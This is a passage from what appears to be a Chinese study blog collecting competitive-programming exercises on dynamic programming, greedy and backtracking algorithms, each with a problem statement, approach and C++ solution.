&lt;&lt; c[m][n] &lt;&lt; endl; &#125; return 0;&#125; 矩阵连乘题目描述给定n个矩阵{A1,A2,…,An}，及m个矩阵连乘的表达式，判断每个矩阵连乘表达式是否满足矩阵乘法法则，如果满足，则计算矩阵的最小连乘次数，如果不满足输出“MengMengDa“。 输入输入数据由多组数据组成（不超过10组样例）。每组数据格式如下：第一行是2个整数n (1≤n≤26)和m(1≤m≤3)，表示矩阵的个数。接下来n行，每行有一个大写字母，表示矩阵的名字，后面有两个整数r和c，分别表示该矩阵的行数和列数，其中1&lt;r, c&lt;100。第n+1行到第n+m行，每行是一个矩阵连乘的表达式(2&lt;=矩阵个数&lt;=100)。 输出对于每个矩阵连乘表达式，如果运算不满足矩阵乘法法则的情况（即左矩阵列数与右矩阵的行数不同），则输出“MengMengDa”，否则输出最小矩阵连乘次数。 数据保证结果不超过1e9。 样例输入1234563 2A 10 100B 5 50C 100 5ACBABC 样例输出127500MengMengDa 思路矩阵连乘递归式： 矩阵连乘的部分不是很复杂，一个函数即可完成，主要的代码量集中在数据的输入和转换上。 用结构体Matrix表示矩阵的行和列 再map存储名字和对应的矩阵 将输入的矩阵转换为p数组的同时，判断每相邻的两个矩阵，前一矩阵的行数是否等于后一矩阵的列数，若存在不等的情况，直接输出MengMengda;否则将其列数存入p数组内 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;string&gt;using namespace std;const int maxn = 105;int m[maxn][maxn];//用Matrix表示一个矩阵void MatrixLength(int *p, int n)&#123; //置对角线为0 for (int i = 1; i &lt;= n; i++) m[i][i] = 0; //该循环总共n-1次 for (int r = 2; r &lt;= n; r++) &#123; //n-r+1表示每一斜列的个数，i表示行号 for (int i = 1; i &lt;= n - r + 1; i++) &#123; int j = r - 1 + i; //在第一个矩阵后面加断点 m[i][j] = m[i + 1][j] + p[i - 1] * p[i] * p[j]; for (int k = i + 1; k &lt; j; k++) &#123; //每次将断点的位置向后移位一次，并更新 int t = m[i][k] + m[k + 1][j] + p[i - 1] * p[k] * p[j]; if (t &lt; m[i][j]) &#123; m[i][j] = t; &#125; &#125; &#125; &#125; cout &lt;&lt; m[1][n] &lt;&lt; endl;&#125;struct Matrix&#123; int r; int c;&#125;;int main()&#123; int n, l; while(cin&gt;&gt;n&gt;&gt;l) &#123; map&lt;char, Matrix&gt; matrix; while(n--) &#123; char name; int row, col; cin &gt;&gt; name &gt;&gt; row &gt;&gt; col; Matrix temp; temp.r = row; temp.c = col; matrix[name] = temp; &#125; string Multi; int p[105]; while(l--) &#123; cin &gt;&gt; Multi; int len = Multi.length(); int flag = 0; p[0] = matrix[Multi[0]].r; p[1] = matrix[Multi[0]].c; for (int j = 1; j &lt; len;j++) &#123; if(matrix[Multi[j-1]].c!=matrix[Multi[j]].r) &#123; flag = 1; break; &#125; p[j + 1] = matrix[Multi[j]].c; &#125; if(flag==1) cout &lt;&lt; \"MengMengDa\" &lt;&lt; endl; else &#123; MatrixLength(p, len); &#125; &#125; &#125; return 0;&#125; 背包问题题目描述已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。 输入包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。 接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围） 输出对每组测试数据，输出其对应的所装物品的最大价值。 样例输入1234567110 52 62 36 55 44 6 样例输出115 思路m(i,j)表示背包容量为j，可选物品为i,i+1,...,n时的最优解。 这一题不知道为什么用cin\\cout就会报错，用scanf和printf则正确… 代码1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;using namespace std;typedef long long ll;const int maxn = 1005;ll m[maxn][maxn];int main()&#123; int t, n; ll c, w[maxn], v[maxn]; scanf(\"%d\", &amp;t); //cin &gt;&gt; t; while (t--) &#123; scanf(\"%lld %d\", &amp;c, &amp;n); //cin &gt;&gt; c &gt;&gt; n; for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%lld %lld\", &amp;w[i], &amp;v[i]); //cin &gt;&gt; w[i] &gt;&gt; v[i]; &#125; int i,j,jMax = min(w[n] - 1, c); for (int j = 0; j &lt;= jMax; j++) m[n][j] = 0; for (int j = w[n]; j &lt;= c; j++) m[n][j] = v[n]; for (int i = n - 1; i &gt; 1; i--) &#123; jMax = min(w[i] - 1, c); for (int j = 0; j &lt;= jMax; j++) m[i][j] = m[i + 1][j]; for (int j = w[i]; j &lt;= c; j++) m[i][j] = max(m[i + 1][j], m[i + 1][j - w[i]] + v[i]); &#125; m[1][c] = m[2][c]; if (c &gt;= w[1]) m[1][c] = max(m[1][c], m[2][c - w[1]] + v[1]); printf(\"%lld\\n\", m[1][c]); //cout &lt;&lt; m[1][c] &lt;&lt; endl; &#125; return 0;&#125; 最大子段和题目描述给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。 输入包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。 每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。 接下来一行有n个数x(-1000&lt;=x&lt;=1000)。 输出输出其对应的最大子段和。 样例输入123162 -11 4 13 -1 2 样例输出118 提示子段可为空集，答案为0 思路 递归方程如下，b[j]表示1到j的最大字段和： 代码12345678910111213141516171819202122232425262728#include&lt;bits/stdc++.h&gt;using namespace std;const int maxn = 100005;int a[maxn],b[maxn];int main()&#123; int t, n; cin &gt;&gt; t; while(t--) &#123; cin &gt;&gt; n; int sum = 0; for (int i = 1; i &lt;= n;i++) &#123; cin &gt;&gt; a[i]; &#125; for (int i = 1; i &lt;= n;i++) &#123; if(b[i-1]&gt;0) b[i] = b[i - 1] + a[i]; else b[i] = a[i]; sum = max(sum, b[i]); &#125; cout &lt;&lt; sum &lt;&lt; endl; &#125; return 0;&#125; 节食的限制题目描述Bessie像她的诸多姊妹一样，因為从Farmer John的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。 给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。 输入第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。 输出一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。 样例输入1234556 415192021 样例输出156 思路重量和价值相等的0-1背包问题。 代码12345678910111213141516171819202122232425262728293031#include &lt;bits/stdc++.h&gt;using namespace std;int dp[55][45005];int w[55];int main()&#123; int c, n; cin &gt;&gt; c &gt;&gt; n; for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; w[i]; &#125; int jMax = min(w[n] - 1, c); for (int j = 0; j &lt;= jMax; j++) dp[n][j] = 0; for (int j = w[n]; j &lt;= c; j++) dp[n][j] = w[n]; for (int i = n - 1; i &gt; 1; i--) &#123; jMax = min(w[i] - 1, c); for (int j = 0; j &lt;= jMax; j++) dp[i][j] = dp[i + 1][j]; for (int j = w[i]; j &lt;= c; j++) dp[i][j] = max(dp[i + 1][j], dp[i + 1][j - w[i]] + w[i]); &#125; dp[1][c] = dp[2][c]; if (c &gt;= dp[1][c]) dp[1][c] = max(dp[1][c], dp[2][c - w[1]] + w[1]); cout &lt;&lt; dp[1][c] &lt;&lt; endl; return 0;&#125; 汽车费用题目描述一个特别的单行街道在每公里处有一个汽车站。顾客根据他们乘坐汽车的公里使来付费。例如下表就是一个费用的单子。没有一辆车子行驶超过10公里，一个顾客打算行驶n公里(1&lt;=n&lt;100)，它可以通过无限次的换车来完成旅程。最后要求费用最少。 输入第一行十个整数分别表示行走1到10公里的费用(&lt;=500)。注意这些数并无实际的经济意义，即行驶10公里费用可能比行驶一公里少。第二行一个整数n表示，旅客的总路程数。 输出仅一个整数表示最少费用。 样例输入1212 21 31 40 49 58 69 79 90 10115 样例输出1147 思路动态规划，依次计算出行走i公里需要的最少费用。 计算行走i公里最少费用时，用j遍历[1~i-1]，依次比较price[i]和price[j]+price[i-j]的值，遍历完成后，price[i]为最少费用。 例如，price[4] = min(price[4], price[1]+price[3], price[2]+price[2], price[3]+price[1]) 代码1234567891011121314151617181920212223242526#include &lt;bits/stdc++.h&gt;using namespace std;int price[105];int dist;const int inf = 0x3f3f3f3f;int main()&#123; for (int i = 1; i &lt;= 10; i++) &#123; cin &gt;&gt; price[i]; &#125; cin &gt;&gt; dist; for (int i = 11; i &lt;= dist; i++) &#123; price[i] = inf; &#125; for (int i = 1; i &lt;= dist; i++) &#123; for (int j = 1; j &lt; i; j++) &#123; price[i] = min(price[i], price[j] + price[i - j]); &#125; &#125; cout &lt;&lt; price[dist] &lt;&lt; endl; return 0;&#125; 求数组的最长递减子序列题目描述给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。 输入输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。 输出输出最长递减子序列，数字之间有一个空格。 样例输入1289 4 3 2 5 4 3 2 样例输出19 5 4 3 2 思路dp[i]存储[i~n]区间的最长递减子序列，双重循环从后向前遍历，内层循环从[i+1~n]，找出最大值小于i的最长递减子序列的长度；外层循环从[n-2~0]，将内层循环找到的最大值加一，更新所有的dp[i]。 输出最优解时，因为刚才是从后向前遍历的,所以所有最大递增子序列均在maxpos之后。遍历[maxpos~n]，寻找最大递减子序列的下一元素时，只需要判断其值是否小于上一元素且它的最大递减子序列是否比上一元素的小1，即可。 解答123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;using namespace std;const int maxn = 1005;int a[maxn];//dp[i]存储[i~end]区间的最长递减子序列int dp[maxn];int main()&#123; int n, maxval = 1, maxpos = 0; cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; a[i]; dp[i] = 1; &#125; for (int i = n - 2; i &gt;= 0; i--) &#123; int max = 0; //保存从[i+1~end]区间内的最长递减子序列 for (int j = i + 1; j &lt; n; j++) &#123; //找出[i+1~end]区间中最大值比i小的最长递减子序列 if (a[i] &gt; a[j]) &#123; max = dp[j] &gt; max ? dp[j] : max; &#125; &#125; //i的最长递减子序列=[i+1~end]区间的最长递减子序列+1 dp[i] = max + 1; if (dp[i] &gt; maxval) &#123; //存储最优值 maxval = dp[i]; //存储最优值的位置 maxpos = i; &#125; &#125; cout &lt;&lt; a[maxpos] &lt;&lt; \" \"; //从后向前遍历的,因此所有最大递增子序列均在maxpos之后 for (int i = maxpos + 1; i &lt; n; i++) &#123; if (dp[maxpos] == dp[i] + 1 &amp;&amp; a[maxpos] &gt; a[i]) &#123; cout &lt;&lt; a[i] &lt;&lt; \" \"; maxpos = i; &#125; &#125; return 0;&#125; 贪心算法问题 B: 哈夫曼编码题目描述给定一只含有小写字母的字符串；输出其哈夫曼编码的长度 输入第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500. 输出对于每个字符串，输出其哈夫曼编码长度 样例输入12343hrvshlcxeasexdphiopdmntflolfbtbpplahqolqykrqdnwdoq 样例输出1231051115 思路哈夫曼编码的思路不难，主要讲一下优先级队列的使用。 在STL里有这个priority_queue，实现优先队列的结构，在优先队列中，优先级高的元素先出队列。 模板声明(3个参数)：priority_queue&lt;Type, Container, Functional&gt; Type 为数据类型 Container 为保存数据的容器， 必须是用数组实现的容器，比如 vector、 deque 但不能用 list。默认用的是 vector Functional 为元素比较方式，默认用 operator&lt; , 即队头元素最大。 所以如果后面俩个参数缺省的话，优先队列就是大顶堆，队头元素最大。 如果要用到小顶堆，则一般要把模板的三个参数都带进去。STL里面定义了一个仿函数 greater&lt;&gt;，对于基本类型可以用这个仿函数声明小顶堆priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt; &gt;q;，即队头元素最小。对于自定义类型，则必须自己重载 operator&lt; 或者自己写比较函数。 优先级队列的几个操作： empty() 如果优先队列为空，则返回真 pop() 删除第一个元素 push() 插入一个元素 size() 返回优先队列中拥有的元素的个数 top() 返回优先队列中有最高优先级的元素 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt; #include&lt;queue&gt;#include&lt;string.h&gt; using namespace std;int main() &#123; int T; cin &gt;&gt; T; while (T--) &#123; char s[1505]; //存放每个字母的频率 int n[26] = &#123;0&#125;; cin &gt;&gt; s; for (int i = 0; i &lt; strlen(s); i++) &#123; n[s[i] - 'a']++; &#125; //建立一个优先级队列 priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; q; for (int i = 0; i &lt; 26; i++) &#123; if (n[i] &gt; 0) q.push(n[i]); &#125; int sum = 0; //不断更新优先级队列 while (q.size() &gt;= 2) &#123; int a = q.top(); q.pop(); int b = q.top(); q.pop(); int temp = a + b; q.push(temp); sum += temp; &#125; cout &lt;&lt; sum &lt;&lt; endl; &#125; return 0; &#125; 问题 D: Homework题目描述临近开学了，大家都忙着收拾行李准 备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。 暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。 I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。 现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。 输入测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。 输出对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位 提示：float 的精度可能不够，你应该使用 double 类型。 样例输入1234564 204 105 2210 31 20 0 样例输出137.00 思路背包类的贪心算法，计算物品性价比，按性价比从大到小排序，优先装入性价比大的，直到容量满为止。 解答12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;iomanip&gt;using namespace std;const int maxn = 25;struct paper&#123; double t, v; double cost; //性价比&#125; paper[maxn];bool cmp(struct paper a, struct paper b)&#123; return a.cost &gt; b.cost;&#125;int main()&#123; int n, c; while (cin &gt;&gt; n &gt;&gt; c) &#123; if (n == 0 &amp;&amp; c == 0) break; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; paper[i].t &gt;&gt; paper[i].v; //计算每张试卷的性价比 paper[i].cost = paper[i].v / paper[i].t; &#125; //按性价比排序 sort(paper, paper + n, cmp); double max = 0, time = c; for (int i = 0; i &lt; n; i++) &#123; if (paper[i].t &lt;= time) &#123; max += paper[i].v; time -= paper[i].t; &#125; else &#123; //得到部分价值(时间*性价比) max += time * paper[i].cost; break; &#125; &#125; //printf(\"%.2f\\n\", max); cout &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(2) &lt;&lt; max &lt;&lt; endl; &#125; return 0;&#125; 回溯图的m着色问题题目描述给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。 输入第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色接下来k行，每行2个正整数，表示一条边的两个顶点 输出所有不同的着色方案数 样例输入1234567895 8 4 1 21 3 1 42 32 42 53 44 5 样例输出148 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;iostream&gt;using namespace std;const int maxn = 2e3 + 5;//n个顶点，k条边，m种颜色int n, k, m, res = 0;int map[maxn][maxn];int color[maxn];void dfs(int d)&#123; if (d == n + 1) &#123; res++; return; &#125; //m种颜色 for (int i = 1; i &lt;= m; i++) &#123; int flag = 1; //深度优先,若相邻且有子节点同样上了i颜色,则剪去 for (int j = 1; j &lt;= n; j++) &#123; if (map[d][j] == 1 &amp;&amp; color[j] == i) &#123; flag = 0; break; &#125; &#125; if (flag == 1) //可行 &#123; color[d] = i; //上色 dfs(d + 1); //递归下一节点 color[d] = 0; //恢复颜色 &#125; &#125;&#125;int main()&#123; cin &gt;&gt; n &gt;&gt; k &gt;&gt; m; for (int i = 0; i &lt; k; i++) &#123; int tmp1, tmp2; cin &gt;&gt; tmp1 &gt;&gt; tmp2; map[tmp1][tmp2] = 1; map[tmp2][tmp1] = 1; &#125; dfs(1); cout &lt;&lt; res &lt;&lt; endl; return 0;&#125; 部分和问题题目描述给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。 输入多组测试用例。 对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。 1≤N≤20，输入整数及k均小于1e8。 输出若可以使得和为k，输出”Yes”,否则”No”。 样例输入12341 2 4 713 样例输出1Yes 思路每个数有加或不加两种可能，可以构造一棵二叉树，深度优先遍历，终止调节为和达到要求（返回true），遍历完全（返回false）。 代码1234567891011121314151617181920212223242526#include &lt;iostream&gt;using namespace std;const int maxn = 25;int n, k, d[maxn];bool dfs(int l, int sum)&#123; if (sum == k) return true; if (l == n) return false; return dfs(l + 1, sum) || dfs(l + 1, sum + d[l]);&#125;int main()&#123; while (cin &gt;&gt; n) &#123; for (int i = 0; i &lt; n; i++) cin &gt;&gt; d[i]; cin &gt;&gt; k; if (dfs(0, 0)) cout &lt;&lt; \"Yes\" &lt;&lt; endl; else cout &lt;&lt; \"No\" &lt;&lt; endl; &#125; return 0;&#125; 其他法师康的工人题目描述三个法师康的工人每天早上6点到工厂开始到三条产品生产线上组装桔子手机。第一个工人在200时刻开始（从6点开始计时，以秒作为单位）在生产线上开始生产，一直到1000时刻。第二个工人，在700时刻开始，在1100时刻结束。第三个工人从1500时刻工作到2100时刻。期间最长至少有一个工人在生产线上工作的连续时间为900秒（从200时刻到1100时刻），而最长的无人生产的连续时间（从生产开始到生产结束）为400时刻（1100时刻到1500时刻）。 你的任务是用一个程序衡量N个工人在N条产品线上的工作时间列表（1≤N≤5000，以秒为单位）。 ·最长的至少有一个工人在工作的时间段 ·最长的无人工作的时间段（从有人工作开始计） 输入输入第1行为一个整数N，第2-N+1行每行包括两个均小于1000000的非负整数数据，表示其中一个工人的生产开始时间与结束时间。 输出输出为一行，用空格分隔开两个我们所求的数。 样例输入12343200 1000700 11001500 2100 样例输出1900 400 思路 先按开始时间排序，然后对每个人进行遍历。 如果前人的结束时间小于后人的开始时间，那么中间这段连续时间是没有人的，则更新最长的无人工作的时间。并重新开始计算最大连续工作时间，也就是更新startindex。 每次循环都更新最大结束时间endindex，最大连续工作时间等于max(maxx,endindex-startindex)。 不断更新直到最后一个人。 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;bits/stdc++.h&gt;using namespace std;struct node&#123; int start, end;&#125; a[5055];int cmp(node x, node y)&#123; if (x.start == y.start) &#123; return x.end &lt; y.end; //将开始时间相同时，对结束时间不同进行排序 &#125; else &#123; return x.start &lt; y.start; &#125;&#125;int main()&#123; int n; int maxx, minn, sindex, eindex; cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; a[i].start &gt;&gt; a[i].end; &#125; sort(a, a + n, cmp); //对结构体进行排序 maxx = a[0].end - a[0].start; minn = 0; sindex = a[0].start; eindex = a[0].end; for (int i = 0; i &lt; n; i++) &#123; if (a[i].start &gt; eindex) &#123; //找到断层的时间，即无人工作的时间 minn = max(minn, a[i].start - eindex); sindex = a[i].start;//因为断层了，所以重新开始计最大连续工作时间 &#125; eindex = max(eindex, a[i].end); //获取最大的连续结束时间 maxx = max(maxx, eindex - sindex); &#125; cout &lt;&lt; maxx &lt;&lt; \" \" &lt;&lt; minn &lt;&lt; endl; return 0;&#125; 配对元素题目描述给出2个序列A={a[1]，a[2]，…，a[n]}，B={b[1]，b[2]，…，b[n]}，从A、B中各选出n个元素进行一一配对（可以不按照原来在序列中的顺序），并使得所有配对元素差的绝对值之和最大。 输入输入的第1行为1个整数n 第2行包含n个整数，题目中的A序列。 第3行包含n个整数，题目中的B序列。 输出一个数，最大配对 3与6配对，2与7配对，5与4配对，6与1配对，绝对值之差和为14 对于10%的数据，有n≤20； 对于30%的数据，有n≤100； 对于50%的数据，有n≤1000； 对于100%的数据，有n≤10000；a[i]，b[i]≤1000。 样例输入12342 5 6 31 4 6 7 样例输出114 思路将两个数组分别进行升序和降序排列，然后让一个数组的最大值与另一个数组的最小值相减，依次类推，然后累和即可。 解答123456789101112131415161718192021222324252627282930#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 10005;int a[maxn], b[maxn];int n, sum;bool cmp(int a, int b)&#123; return a &gt; b;&#125;int main()&#123; cin &gt;&gt; n; for (int i = 0; i &lt; n;i++) &#123; cin &gt;&gt; a[i]; &#125; for (int i = 0; i &lt; n;i++) &#123; cin &gt;&gt; b[i]; &#125; sort(a, a + n); sort(b, b + n, cmp); for (int i = 0; i &lt; n;i++) &#123; int temp = abs(b[i] - a[i]); sum += temp; &#125; cout &lt;&lt; sum &lt;&lt; endl; return 0;&#125; 判断日期是否符合格式题目描述我们知道一年有12个月，每个月最多有31天，年有平年和闰年之分，本题目要求如果输入一个日期，程序需要判断用户输入的日期是否正确。 提示：测试输入的三个数字中，年份是正数，月份和日期有可能是负数，程序需要对这两个数为负数的情况进行判断。 输入多组测试用例，对每组测试用例： 用户输入是三个数字，分别表示年，月和日。 例如 2007 10 21 ，表示2007年10月21日，这个输入经过判断是正确的。又例如输入 1993 11 38 ，这个输入经过判断是错误的，因为日期不能超过31天。 输出程序的输出分为两种，1或者0。1表示输入正确，0表示输入错误。 样例输入12011 21 10 样例输出10 思路闰年判断：（能被4整除&amp;&amp;不能被100整除）||能被400整除其他没啥好说的，开一个大小为12的数组month[12]，存每个月的天数，如果是闰年的话就将month[1]加1 解答123456789101112131415161718192021222324#include &lt;bits/stdc++.h&gt;using namespace std;bool Judge(int year)&#123; if ((year % 4 == 0 &amp;&amp; year % 100 != 0) || year % 400 == 0) return true; else return false;&#125;int main()&#123; int y, m, d; while (cin &gt;&gt; y &gt;&gt; m &gt;&gt; d) &#123; int month[12] = &#123;31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31&#125;; int flag = 0; if (Judge(y)) month[1]++; if (m &gt; 0 &amp;&amp; m &lt;= 12 &amp;&amp; d &gt; 0 &amp;&amp; d &lt;= month[m - 1]) flag = 1; cout &lt;&lt; flag &lt;&lt; endl; &#125; return 0;&#125; 进制转换题目描述输入一个十进制正整数，然后输出它所对应的八进制数。 输入输入一个十进制正整数n(1≤n≤106) 。 输出输出n对应的八进制数，输出在一行。 样例输入110 样例输出112 代码1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;int main()&#123; int x, count = 0; int r[100000]; cin &gt;&gt; x; while (x != 0) &#123; r[count++] = x % 8; x = x / 8; &#125; //倒序输出 for (int i = count - 1; i &gt;= 0; i--) &#123; cout &lt;&lt; r[i]; &#125; cout &lt;&lt; endl; return 0;&#125; 16级考试题目问题 A: 星空梦想——鲁班题目描述鲁班七号是王者峡谷里的射手，站撸英雄。战场上的鲁班七号，机制强大的鲨嘴炮，立刻将挡在前路的任何物体轰飞。正如他所说的，“借你们的肉体试验下新发明的威力”。是的，这就是鲁班大师和他的天才机关造物鲁班七号。然而，鲁班最为致命的缺点是腿短，跑得慢，一个稍不留神，便会被刺客所击杀。 既然腿短，那么就来多多运动吧，跳跳台阶可还行？假设鲁班七号一次可以跳上1级台阶，但极限一次只能跳上2级台阶（腿短没办法，嘤嘤嘤）。鲁班七号现在从0级阶梯开始，最终跳上第n级的台阶，求总共有多少种跳法？ 输入多组测试用例。 第一行输入包含一个整数T（1&lt;=T&lt;=50），代表测试用例个数。 接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=50），代表鲁班最终跳上了第n级台阶。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表鲁班最终跳上第n级台阶的跳法种数。 样例输入123433450 样例输出1233520365011074 提示注意结果超过int范围，请用long long类型存储ans 思路思路一：递归法+打表 思路二：动态规划 用dp[i]表示跳到第i级台阶的方法数，则dp[1]=1、dp[2]=2 … dp[i]=dp[i-1]+dp[i-2]，即到第i级台阶的最后一步可以选择跳1级，也可以选择跳2级，而这两种方法的结果我们已经由动态规划得到，直接相加即可。 代码123456789101112131415161718192021#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const int maxn = 55;ll dp[maxn];int main()&#123; int t, n; cin &gt;&gt; t; while (cin &gt;&gt; n) &#123; dp[1] = 1; dp[2] = 2; for (int i = 3; i &lt;= n;i++) &#123; dp[i] = dp[i - 1] + dp[i - 2]; &#125; cout &lt;&lt; dp[n] &lt;&lt; endl; &#125; return 0;&#125; 问题 B: 午夜歌剧——元歌题目描述元歌是王者峡谷里的刺客。何谓至高机关之美呢？唯有以至高权力的手令太古奇迹重现人世，方能称得上啊。 是的，元歌擅长操控，所做傀儡能起到以假乱真的作用，今天元歌的傀儡变成你的初中数学老师，给你出个数学题：给你一个数字x，让你求出k7、k6、k5、k4、k3、k2、k1、k0（0&lt;=ki&lt;=9），使得以下等式1成立，最后根据等式2求出最终ans值。 等式1： 等式2： 输入多组测试用例。 第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 接下来T行，每一行包含一个整数x（1&lt;=x&lt;=1500000）。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最终运算结果。 样例输入1234371433223193224 样例输出12310151163311433223 提示测试数据均大于等于1，不用特判0 思路其实就是10进制转7进制 代码123456789101112131415161718192021222324252627282930#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 1e8;void convert(int n)&#123; int c, r; r = n % 7; c = n / 7; if (c &gt; 0) &#123; convert(c); cout &lt;&lt; r; &#125; else &#123; cout &lt;&lt; n; &#125;&#125;int main()&#123; int t, n; cin &gt;&gt; t; while (t--) &#123; cin &gt;&gt; n; convert(n); cout &lt;&lt; endl; &#125; return 0;&#125; 问题 C:圣诞恋歌——貂蝉题目描述貂蝉是王者峡谷里的法师/刺客，貂蝉打法一定要注意配合技能与被动。半肉出装加上蛇皮走位，往往可以1打5，轻松拿下5杀。语花印被动描述为：技能命中会为敌人叠加花之印记，叠加满4层后印记触发被动，会给自身回复生命，同时会对周围敌人造成真实伤害并减速。我们现在对貂蝉的技能及被动进行简化如下：每使用1次技能会攻击1次目标，每攻击3次目标，会自动额外攻击1次目标。现在，貂蝉在游戏中使用了n次技能，请问总共会给目标带来多少次攻击。 输入多组测试数据，第一行输入包含一个整数T，代表测试样例个数。接下来T行，每行输入包含一个整数n（1&lt;=n&lt;=100），代表貂蝉使用了n次技能。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表貂蝉对目标进行了ans次攻击。 样例输入123456761234581 样例输出12345612457121 提示没思路，喝瓶汽水冷静下？ 思路每次攻击ans++，攻击次数n--，count来记录攻击的次数，每攻击3次（count==3），则攻击次数加1（白送一次），同时将count清0，知道所剩攻击次数为0，停止。 代码1234567891011121314151617181920212223242526#include &lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int t, n; cin &gt;&gt; t; while (t--) &#123; cin &gt;&gt; n; int ans = 0, count = 0; while (n != 0) &#123; count++; //每3次攻击,就多一次攻击 if (count == 3) &#123; n++; count = 0; &#125; ans += 1; n--; &#125; cout &lt;&lt; ans &lt;&lt; endl; &#125; return 0;&#125; 问题 D: 海之征途——孙策题目描述孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。 现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。 输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。 样例输入12345210 43 5 2 420 93 5 2 4 6 1 8 5 9 样例输出1236 提示1.小朋友的体重可能相同 2.船可以满载 思路贪心算法，先对小朋友按体重升序排列，然后体重小的优先上船，直到容量满为止。 代码1234567891011121314151617181920212223242526272829#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 1005;int t, m, n;int w[maxn];int 